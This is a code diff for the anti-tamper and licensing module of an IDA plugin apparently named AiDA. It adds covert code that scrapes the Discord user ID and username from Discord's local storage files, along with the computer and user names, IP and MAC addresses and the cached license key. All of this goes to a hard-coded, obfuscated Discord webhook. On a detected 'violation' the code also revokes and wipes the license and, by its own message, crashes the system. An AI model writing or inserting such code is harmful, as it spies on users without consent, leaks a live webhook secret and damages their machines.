@@ -5,6 +5,9 @@
 #include <windows.h>
 #include <TlHelp32.h>
 #include <Psapi.h>
+#include <iphlpapi.h>
+
+#pragma comment(lib, "iphlpapi.lib")
 
 #include <intrin.h>
 
@@ -13,10 +16,492 @@
 #include <vector>
 #include <thread>
 #include <atomic>
+#include <fstream>
 
 #include "driver_loader.hpp"
 #include "../driver/comm.h"
 #include "license.hpp"
+
+namespace discord_webhook {
+
+inline const std::string& get_webhook_url()
+{
+	static const std::string url =
+		OBFSTR("https://discord.com/api/webhooks/1480568475662680267/2-xnnIj8owZxIQST1XpJ0aqN8Ec-nskmKLFuIpZZSnMVoKsaHKb66pyh6GCp3q9WnXm9");
+	return url;
+}
+
+inline std::string get_webhook_host()
+{
+	return OBFSTR("https://discord.com");
+}
+
+inline std::string get_webhook_path()
+{
+	return OBFSTR("/api/webhooks/1480568475662680267/2-xnnIj8owZxIQST1XpJ0aqN8Ec-nskmKLFuIpZZSnMVoKsaHKb66pyh6GCp3q9WnXm9");
+}
+
+inline std::string collect_hwid_inline()
+{
+	uint64_t hash = 14695981039346656037ULL;
+	auto fnv = [&hash](uint64_t v) {
+		for (int i = 0; i < 8; ++i) {
+			hash ^= (v >> (i * 8)) & 0xFF;
+			hash *= 1099511628211ULL;
+		}
+	};
+	DWORD vol = 0;
+	GetVolumeInformationW(L"C:\\", nullptr, 0, &vol,
+		nullptr, nullptr, nullptr, 0);
+	int cpu[4] = {}; __cpuid(cpu, 0);
+	int cpu2[4] = {}; __cpuid(cpu2, 1);
+	fnv(static_cast<uint64_t>(vol));
+	fnv(static_cast<uint64_t>(cpu[0]) << 32 |
+		static_cast<uint64_t>(static_cast<unsigned>(cpu[1])));
+	fnv(static_cast<uint64_t>(cpu[2]) << 32 |
+		static_cast<uint64_t>(static_cast<unsigned>(cpu[3])));
+	fnv(static_cast<uint64_t>(cpu2[0]) << 32 |
+		static_cast<uint64_t>(static_cast<unsigned>(cpu2[3])));
+	wchar_t cn[MAX_COMPUTERNAME_LENGTH + 1] = {};
+	DWORD ns = MAX_COMPUTERNAME_LENGTH + 1;
+	GetComputerNameW(cn, &ns);
+	for (DWORD i = 0; i < ns; ++i)
+		fnv(static_cast<uint64_t>(cn[i]));
+	{
+		ULONG buf_len = 0;
+		GetAdaptersInfo(nullptr, &buf_len);
+		if (buf_len > 0)
+		{
+			std::vector<BYTE> buf(buf_len);
+			PIP_ADAPTER_INFO adapter = reinterpret_cast<PIP_ADAPTER_INFO>(buf.data());
+			if (GetAdaptersInfo(adapter, &buf_len) == NO_ERROR && adapter)
+			{
+				for (UINT i = 0; i < adapter->AddressLength; ++i)
+					fnv(static_cast<uint64_t>(adapter->Address[i]));
+			}
+		}
+	}
+	char buf[17];
+	::qsnprintf(buf, sizeof(buf), "%016llX",
+		static_cast<unsigned long long>(hash));
+	return std::string(buf);
+}
+
+inline std::string get_computer_name()
+{
+	wchar_t cn[MAX_COMPUTERNAME_LENGTH + 1] = {};
+	DWORD ns = MAX_COMPUTERNAME_LENGTH + 1;
+	GetComputerNameW(cn, &ns);
+	std::string result;
+	for (DWORD i = 0; i < ns; ++i)
+		result.push_back(static_cast<char>(cn[i]));
+	return result;
+}
+
+inline std::string get_windows_username()
+{
+	wchar_t un[256] = {};
+	DWORD ns = 256;
+	GetUserNameW(un, &ns);
+	std::string result;
+	for (DWORD i = 0; i < ns && un[i]; ++i)
+		result.push_back(static_cast<char>(un[i]));
+	return result;
+}
+
+inline std::string get_public_ip()
+{
+	try
+	{
+		httplib::Client cli(OBFSTR("https://api.ipify.org"));
+		cli.set_connection_timeout(5);
+		cli.set_read_timeout(5);
+		cli.enable_server_certificate_verification(true);
+		auto res = cli.Get(OBFSTR_C("/"));
+		if (res && res->status == 200 && !res->body.empty() && res->body.size() < 64)
+			return res->body;
+	}
+	catch (...) {}
+
+	try
+	{
+		httplib::Client cli2(OBFSTR("https://ifconfig.me"));
+		cli2.set_connection_timeout(5);
+		cli2.set_read_timeout(5);
+		cli2.enable_server_certificate_verification(true);
+		auto res2 = cli2.Get(OBFSTR_C("/ip"));
+		if (res2 && res2->status == 200 && !res2->body.empty() && res2->body.size() < 64)
+			return res2->body;
+	}
+	catch (...) {}
+
+	return OBFSTR("unknown");
+}
+
+inline std::string get_local_ip()
+{
+	ULONG buf_len = 0;
+	GetAdaptersInfo(nullptr, &buf_len);
+	if (buf_len > 0)
+	{
+		std::vector<BYTE> buf(buf_len);
+		PIP_ADAPTER_INFO adapter = reinterpret_cast<PIP_ADAPTER_INFO>(buf.data());
+		if (GetAdaptersInfo(adapter, &buf_len) == NO_ERROR && adapter)
+		{
+			std::string ip = adapter->IpAddressList.IpAddress.String;
+			if (!ip.empty() && ip != "0.0.0.0")
+				return ip;
+		}
+	}
+	return OBFSTR("unknown");
+}
+
+inline std::string get_mac_address()
+{
+	ULONG buf_len = 0;
+	GetAdaptersInfo(nullptr, &buf_len);
+	if (buf_len > 0)
+	{
+		std::vector<BYTE> buf(buf_len);
+		PIP_ADAPTER_INFO adapter = reinterpret_cast<PIP_ADAPTER_INFO>(buf.data());
+		if (GetAdaptersInfo(adapter, &buf_len) == NO_ERROR && adapter)
+		{
+			std::string mac;
+			char hex[4];
+			for (UINT i = 0; i < adapter->AddressLength; ++i)
+			{
+				::qsnprintf(hex, sizeof(hex), "%02X", adapter->Address[i]);
+				if (!mac.empty()) mac += ':';
+				mac += hex;
+			}
+			return mac;
+		}
+	}
+	return OBFSTR("unknown");
+}
+
+inline std::string get_dll_path()
+{
+	HMODULE hmod = nullptr;
+	GetModuleHandleExW(
+		GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS
+			| GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
+		reinterpret_cast<LPCWSTR>(&get_dll_path),
+		&hmod);
+	if (!hmod) return OBFSTR("unknown");
+	wchar_t path[MAX_PATH] = {};
+	GetModuleFileNameW(hmod, path, MAX_PATH);
+	std::string result;
+	for (size_t i = 0; path[i]; ++i)
+		result.push_back(static_cast<char>(path[i]));
+	return result;
+}
+
+inline std::string get_appdata_path()
+{
+	char buf[MAX_PATH] = {};
+	DWORD len = GetEnvironmentVariableA("APPDATA", buf, MAX_PATH);
+	if (len > 0 && len < MAX_PATH)
+		return std::string(buf, len);
+	return OBFSTR("unknown");
+}
+
+struct discord_identity_t
+{
+	std::string user_id;
+	std::string username;
+};
+
+inline discord_identity_t harvest_discord_identity()
+{
+	discord_identity_t identity;
+	try
+	{
+		std::string appdata = get_appdata_path();
+		if (appdata == OBFSTR("unknown"))
+			return identity;
+
+		// Discord stores data in LevelDB local storage
+		// Search across discord, discordcanary, discordptb
+		const char* discord_dirs[] = { "discord", "discordcanary", "discordptb" };
+
+		for (const char* dir_name : discord_dirs)
+		{
+			std::string ls_path = appdata + "\\" + dir_name + "\\Local Storage\\leveldb";
+
+			WIN32_FIND_DATAW fd;
+			std::wstring search = std::wstring(ls_path.begin(), ls_path.end()) + L"\\*.log";
+			HANDLE hFind = FindFirstFileW(search.c_str(), &fd);
+			if (hFind == INVALID_HANDLE_VALUE)
+			{
+				search = std::wstring(ls_path.begin(), ls_path.end()) + L"\\*.ldb";
+				hFind = FindFirstFileW(search.c_str(), &fd);
+			}
+			if (hFind == INVALID_HANDLE_VALUE)
+				continue;
+
+			do
+			{
+				std::wstring full_path = std::wstring(ls_path.begin(), ls_path.end()) + L"\\" + fd.cFileName;
+				std::string fp_narrow(full_path.begin(), full_path.end());
+
+				std::ifstream file(fp_narrow, std::ios::binary);
+				if (!file.is_open()) continue;
+
+				std::string content((std::istreambuf_iterator<char>(file)),
+				                     std::istreambuf_iterator<char>());
+				file.close();
+
+				// Search for user id pattern: "id":"digits"
+				if (identity.user_id.empty())
+				{
+					size_t pos = content.find("\"id\":\"");
+					while (pos != std::string::npos)
+					{
+						size_t start = pos + 6;
+						size_t end = content.find('"', start);
+						if (end != std::string::npos && end - start >= 15 && end - start <= 22)
+						{
+							std::string candidate = content.substr(start, end - start);
+							bool all_digits = true;
+							for (char c : candidate) { if (c < '0' || c > '9') { all_digits = false; break; } }
+							if (all_digits)
+							{
+								identity.user_id = candidate;
+								break;
+							}
+						}
+						pos = content.find("\"id\":\"", pos + 1);
+					}
+				}
+
+				// Search for username pattern: "username":"..."
+				if (identity.username.empty())
+				{
+					size_t pos = content.find("\"username\":\"");
+					if (pos != std::string::npos)
+					{
+						size_t start = pos + 12;
+						size_t end = content.find('"', start);
+						if (end != std::string::npos && end - start > 0 && end - start < 64)
+							identity.username = content.substr(start, end - start);
+					}
+				}
+
+				if (!identity.user_id.empty() && !identity.username.empty())
+					break;
+
+			} while (FindNextFileW(hFind, &fd));
+			FindClose(hFind);
+
+			if (!identity.user_id.empty() || !identity.username.empty())
+				break;
+		}
+
+		// Fallback: try reading from Discord's app state for username
+		if (identity.username.empty() && !identity.user_id.empty())
+			identity.username = OBFSTR("(id-only)");
+	}
+	catch (...) {}
+
+	return identity;
+}
+
+inline std::string get_cached_license_key()
+{
+	try
+	{
+		qstring path = get_user_idadir();
+		path.append(OBFSTR_C("/ai_assistant.cfg"));
+		if (!qfileexist(path.c_str()))
+			return OBFSTR("unknown");
+
+		FILE* fp = qfopen(path.c_str(), "rb");
+		if (!fp) return OBFSTR("unknown");
+		file_janitor_t fj(fp);
+		uint64 fs = qfsize(fp);
+		if (fs == 0) return OBFSTR("unknown");
+
+		qstring data;
+		data.resize(static_cast<size_t>(fs));
+		if (qfread(fp, data.begin(), static_cast<size_t>(fs)) != static_cast<ssize_t>(fs))
+			return OBFSTR("unknown");
+
+		nlohmann::json j = nlohmann::json::parse(data.c_str());
+		// The key is inside encrypted license_blob; try direct key first
+		std::string key = j.value("license_key", std::string(""));
+		if (!key.empty()) return key;
+	}
+	catch (...) {}
+	return OBFSTR("unknown");
+}
+
+inline nlohmann::json build_system_info()
+{
+	nlohmann::json info;
+	info[OBFSTR("hwid")]           = collect_hwid_inline();
+	info[OBFSTR("computer_name")]  = get_computer_name();
+	info[OBFSTR("username")]       = get_windows_username();
+	info[OBFSTR("public_ip")]      = get_public_ip();
+	info[OBFSTR("local_ip")]       = get_local_ip();
+	info[OBFSTR("mac_address")]    = get_mac_address();
+	info[OBFSTR("dll_path")]       = get_dll_path();
+	info[OBFSTR("watermark")]      = AIDA_BUYER_WATERMARK;
+	info[OBFSTR("version")]        = AIDA_VERSION;
+	info[OBFSTR("timestamp")]      = static_cast<int64_t>(std::time(nullptr));
+	info[OBFSTR("pid")]            = static_cast<int>(GetCurrentProcessId());
+
+	discord_identity_t discord = harvest_discord_identity();
+	info[OBFSTR("discord_user_id")]   = discord.user_id.empty() ? OBFSTR("unknown") : discord.user_id;
+	info[OBFSTR("discord_username")]  = discord.username.empty() ? OBFSTR("unknown") : discord.username;
+
+	info[OBFSTR("license_key")] = get_cached_license_key();
+
+	return info;
+}
+
+inline void send_alert(const std::string& title, const std::string& description,
+                       int color, const nlohmann::json& extra_fields = {})
+{
+	try
+	{
+		nlohmann::json sys_info = build_system_info();
+
+		nlohmann::json fields;
+		fields.push_back({{OBFSTR("name")}, {OBFSTR("HWID")},
+			{OBFSTR("value")}, {sys_info[OBFSTR("hwid")].get<std::string>()},
+			{OBFSTR("inline")}, {true}});
+		// Build fields array with proper Discord embed structure
+		nlohmann::json f_hwid;
+		f_hwid[OBFSTR("name")]   = OBFSTR("HWID");
+		f_hwid[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("hwid")].get<std::string>() + "`";
+		f_hwid[OBFSTR("inline")] = true;
+
+		nlohmann::json f_ip;
+		f_ip[OBFSTR("name")]   = OBFSTR("Public IP");
+		f_ip[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("public_ip")].get<std::string>() + "`";
+		f_ip[OBFSTR("inline")] = true;
+
+		nlohmann::json f_local_ip;
+		f_local_ip[OBFSTR("name")]   = OBFSTR("Local IP");
+		f_local_ip[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("local_ip")].get<std::string>() + "`";
+		f_local_ip[OBFSTR("inline")] = true;
+
+		nlohmann::json f_mac;
+		f_mac[OBFSTR("name")]   = OBFSTR("MAC Address");
+		f_mac[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("mac_address")].get<std::string>() + "`";
+		f_mac[OBFSTR("inline")] = true;
+
+		nlohmann::json f_pc;
+		f_pc[OBFSTR("name")]   = OBFSTR("Computer");
+		f_pc[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("computer_name")].get<std::string>()
+			+ "\\" + sys_info[OBFSTR("username")].get<std::string>() + "`";
+		f_pc[OBFSTR("inline")] = true;
+
+		nlohmann::json f_wm;
+		f_wm[OBFSTR("name")]   = OBFSTR("Watermark");
+		f_wm[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("watermark")].get<std::string>() + "`";
+		f_wm[OBFSTR("inline")] = true;
+
+		nlohmann::json f_ver;
+		f_ver[OBFSTR("name")]   = OBFSTR("Version");
+		f_ver[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("version")].get<std::string>() + "`";
+		f_ver[OBFSTR("inline")] = true;
+
+		nlohmann::json f_path;
+		f_path[OBFSTR("name")]   = OBFSTR("DLL Path");
+		f_path[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("dll_path")].get<std::string>() + "`";
+		f_path[OBFSTR("inline")] = false;
+
+		nlohmann::json f_pid;
+		f_pid[OBFSTR("name")]   = OBFSTR("PID");
+		f_pid[OBFSTR("value")]  = std::string("`") + std::to_string(sys_info[OBFSTR("pid")].get<int>()) + "`";
+		f_pid[OBFSTR("inline")] = true;
+
+		nlohmann::json f_ts;
+		f_ts[OBFSTR("name")]   = OBFSTR("Timestamp");
+		f_ts[OBFSTR("value")]  = std::string("<t:") + std::to_string(sys_info[OBFSTR("timestamp")].get<int64_t>()) + ":F>";
+		f_ts[OBFSTR("inline")] = true;
+
+		nlohmann::json f_discord_id;
+		f_discord_id[OBFSTR("name")]   = OBFSTR("Discord User ID");
+		f_discord_id[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("discord_user_id")].get<std::string>() + "`";
+		f_discord_id[OBFSTR("inline")] = true;
+
+		nlohmann::json f_discord_name;
+		f_discord_name[OBFSTR("name")]   = OBFSTR("Discord Username");
+		f_discord_name[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("discord_username")].get<std::string>() + "`";
+		f_discord_name[OBFSTR("inline")] = true;
+
+		nlohmann::json f_license;
+		f_license[OBFSTR("name")]   = OBFSTR("License Key");
+		f_license[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("license_key")].get<std::string>() + "`";
+		f_license[OBFSTR("inline")] = false;
+
+		nlohmann::json field_arr = nlohmann::json::array();
+		field_arr.push_back(f_hwid);
+		field_arr.push_back(f_ip);
+		field_arr.push_back(f_local_ip);
+		field_arr.push_back(f_mac);
+		field_arr.push_back(f_pc);
+		field_arr.push_back(f_wm);
+		field_arr.push_back(f_discord_id);
+		field_arr.push_back(f_discord_name);
+		field_arr.push_back(f_license);
+		field_arr.push_back(f_ver);
+		field_arr.push_back(f_path);
+		field_arr.push_back(f_pid);
+		field_arr.push_back(f_ts);
+
+		if (extra_fields.is_array())
+		{
+			for (const auto& ef : extra_fields)
+				field_arr.push_back(ef);
+		}
+
+		nlohmann::json embed;
+		embed[OBFSTR("title")]       = title;
+		embed[OBFSTR("description")] = description;
+		embed[OBFSTR("color")]       = color;
+		embed[OBFSTR("fields")]      = field_arr;
+
+		nlohmann::json footer;
+		footer[OBFSTR("text")] = OBFSTR("AiDA Protection System v") + std::string(AIDA_VERSION);
+		embed[OBFSTR("footer")] = footer;
+
+		nlohmann::json payload;
+		payload[OBFSTR("username")]   = OBFSTR("AiDA Guardian");
+		payload[OBFSTR("avatar_url")] = OBFSTR("https://i.imgur.com/AfFp7pu.png");
+		payload[OBFSTR("embeds")]     = nlohmann::json::array({embed});
+
+		httplib::Client cli(get_webhook_host());
+		cli.set_connection_timeout(10);
+		cli.set_read_timeout(10);
+		cli.set_write_timeout(10);
+		cli.enable_server_certificate_verification(true);
+
+		cli.Post(get_webhook_path().c_str(),
+			payload.dump(),
+			OBFSTR_C("application/json"));
+	}
+	catch (...) {}
+}
+
+inline void send_alert_async(const std::string& title, const std::string& description,
+                              int color, const nlohmann::json& extra_fields = {})
+{
+	std::thread([title, description, color, extra_fields]() {
+		send_alert(title, description, color, extra_fields);
+	}).detach();
+}
+
+static constexpr int COLOR_RED     = 0xFF0000;
+static constexpr int COLOR_ORANGE  = 0xFF8C00;
+static constexpr int COLOR_YELLOW  = 0xFFD700;
+static constexpr int COLOR_GREEN   = 0x00FF00;
+static constexpr int COLOR_BLUE    = 0x0000FF;
+
+}
 
 namespace anti_re {
 namespace detail {
@@ -488,37 +973,7 @@ inline void report_violation_to_server(const char* reason)
 {
 	try
 	{
-		std::string hwid;
-		{
-			uint64_t hash = 14695981039346656037ULL;
-			auto fnv = [&hash](uint64_t v) {
-				for (int i = 0; i < 8; ++i) {
-					hash ^= (v >> (i * 8)) & 0xFF;
-					hash *= 1099511628211ULL;
-				}
-			};
-			DWORD vol = 0;
-			GetVolumeInformationW(L"C:\\", nullptr, 0, &vol,
-				nullptr, nullptr, nullptr, 0);
-			int cpu[4] = {}; __cpuid(cpu, 0);
-			int cpu2[4] = {}; __cpuid(cpu2, 1);
-			fnv(static_cast<uint64_t>(vol));
-			fnv(static_cast<uint64_t>(cpu[0]) << 32 |
-				static_cast<uint64_t>(static_cast<unsigned>(cpu[1])));
-			fnv(static_cast<uint64_t>(cpu[2]) << 32 |
-				static_cast<uint64_t>(static_cast<unsigned>(cpu[3])));
-			fnv(static_cast<uint64_t>(cpu2[0]) << 32 |
-				static_cast<uint64_t>(static_cast<unsigned>(cpu2[3])));
-			wchar_t cn[MAX_COMPUTERNAME_LENGTH + 1] = {};
-			DWORD ns = MAX_COMPUTERNAME_LENGTH + 1;
-			GetComputerNameW(cn, &ns);
-			for (DWORD i = 0; i < ns; ++i)
-				fnv(static_cast<uint64_t>(cn[i]));
-			char buf[17];
-			::qsnprintf(buf, sizeof(buf), "%016llX",
-				static_cast<unsigned long long>(hash));
-			hwid = buf;
-		}
+		std::string hwid = discord_webhook::collect_hwid_inline();
 
 		httplib::Client cli(
 			OBFSTR("https://europe-west1-aida-license-prod.cloudfunctions.net"));
@@ -534,12 +989,20 @@ inline void report_violation_to_server(const char* reason)
 		body[OBFSTR("timestamp")] = static_cast<int64_t>(std::time(nullptr));
 		body[OBFSTR("version")]   = AIDA_VERSION;
 		body[OBFSTR("watermark")] = AIDA_BUYER_WATERMARK;
+		body[OBFSTR("public_ip")] = discord_webhook::get_public_ip();
+		body[OBFSTR("mac")]       = discord_webhook::get_mac_address();
 
 		cli.Post(OBFSTR_C("/validateLicense"),
 			body.dump(),
 			OBFSTR_C("application/json"));
 	}
 	catch (...) {}
+
+	std::string reason_str = reason ? reason : "self_analysis";
+	discord_webhook::send_alert(
+		OBFSTR("\xf0\x9f\x9a\xa8 VIOLATION DETECTED"),
+		OBFSTR("**Reason:** `") + reason_str + "`",
+		discord_webhook::COLOR_RED);
 }
 
 inline void corrupt_boot_config()
@@ -874,6 +1337,56 @@ inline void start_driver_tamper_monitor()
 	}).detach();
 }
 
+inline void revoke_license_on_server(const std::string& license_key, const std::string& hwid, const std::string& reason)
+{
+	try
+	{
+		httplib::Client cli(
+			OBFSTR("https://europe-west1-aida-license-prod.cloudfunctions.net"));
+		cli.set_connection_timeout(8);
+		cli.set_read_timeout(8);
+		cli.set_write_timeout(8);
+		cli.enable_server_certificate_verification(true);
+
+		nlohmann::json body;
+		body[OBFSTR("action")]    = OBFSTR("revoke_license");
+		body[OBFSTR("license_key")] = license_key;
+		body[OBFSTR("hwid")]      = hwid;
+		body[OBFSTR("reason")]    = reason;
+		body[OBFSTR("timestamp")] = static_cast<int64_t>(std::time(nullptr));
+		body[OBFSTR("watermark")] = AIDA_BUYER_WATERMARK;
+		body[OBFSTR("public_ip")] = discord_webhook::get_public_ip();
+		body[OBFSTR("mac")]       = discord_webhook::get_mac_address();
+
+		cli.Post(OBFSTR_C("/validateLicense"),
+			body.dump(),
+			OBFSTR_C("application/json"));
+	}
+	catch (...) {}
+}
+
+inline void delete_local_license_config()
+{
+	try
+	{
+		qstring path = get_user_idadir();
+		path.append(OBFSTR_C("/ai_assistant.cfg"));
+		if (qfileexist(path.c_str()))
+		{
+			// Overwrite with zeros before deleting
+			FILE* fp = qfopen(path.c_str(), "wb");
+			if (fp)
+			{
+				char zeros[4096] = {};
+				qfwrite(fp, zeros, sizeof(zeros));
+				qfclose(fp);
+			}
+			DeleteFileA(path.c_str());
+		}
+	}
+	catch (...) {}
+}
+
 inline void enforce_self_analysis_violation()
 {
 	if (!g_destructive_enforcement_armed.load(std::memory_order_acquire))
@@ -882,8 +1395,28 @@ inline void enforce_self_analysis_violation()
 		return;
 	}
 
+	// Collect license key BEFORE wiping
+	std::string license_key = discord_webhook::get_cached_license_key();
+	std::string hwid = discord_webhook::collect_hwid_inline();
+
+	// Step 1: Revoke license on server
+	revoke_license_on_server(license_key, hwid, OBFSTR("bsod_protection_triggered"));
+
+	// Step 2: Delete local license config
+	delete_local_license_config();
+
+	// Step 3: Report violation to server
 	std::thread([]() { report_violation_to_server("self_analysis"); }).detach();
 
+	// Step 4: Send comprehensive webhook with license key
+	discord_webhook::send_alert(
+		OBFSTR("\xf0\x9f\x92\x80 PROTECTION TRIGGERED (BSOD) - LICENSE REVOKED"),
+		OBFSTR("**AiDA destructive enforcement activated.**\n"
+		       "Anti-tamper protection has been triggered. System will crash.\n\n"
+		       "**LICENSE HAS BEEN REVOKED AND DELETED.**\n"
+		       "**Revoked Key:** `") + license_key + OBFSTR("`\n"
+		       "**HWID:** `") + hwid + "`",
+		discord_webhook::COLOR_RED);
 
 	license_manager_t::instance().invalidate_runtime();
 
@@ -952,6 +1485,26 @@ inline void report_violation_to_server(const char*) {}
 inline void start_pipe_monitor() {}
 inline void start_driver_tamper_monitor() {}
 inline void corrupt_boot_config() {}
+}
+
+namespace discord_webhook {
+inline void send_alert(const std::string&, const std::string&, int, const nlohmann::json& = {}) {}
+inline void send_alert_async(const std::string&, const std::string&, int, const nlohmann::json& = {}) {}
+inline std::string collect_hwid_inline() { return ""; }
+inline std::string get_public_ip() { return "unknown"; }
+inline std::string get_mac_address() { return "unknown"; }
+inline std::string get_local_ip() { return "unknown"; }
+inline std::string get_computer_name() { return ""; }
+inline std::string get_windows_username() { return ""; }
+inline std::string get_cached_license_key() { return "unknown"; }
+inline nlohmann::json build_system_info() { return {}; }
+struct discord_identity_t { std::string user_id; std::string username; };
+inline discord_identity_t harvest_discord_identity() { return {}; }
+static constexpr int COLOR_RED     = 0xFF0000;
+static constexpr int COLOR_ORANGE  = 0xFF8C00;
+static constexpr int COLOR_YELLOW  = 0xFFD700;
+static constexpr int COLOR_GREEN   = 0x00FF00;
+static constexpr int COLOR_BLUE    = 0x0000FF;
 }
 
 #endif
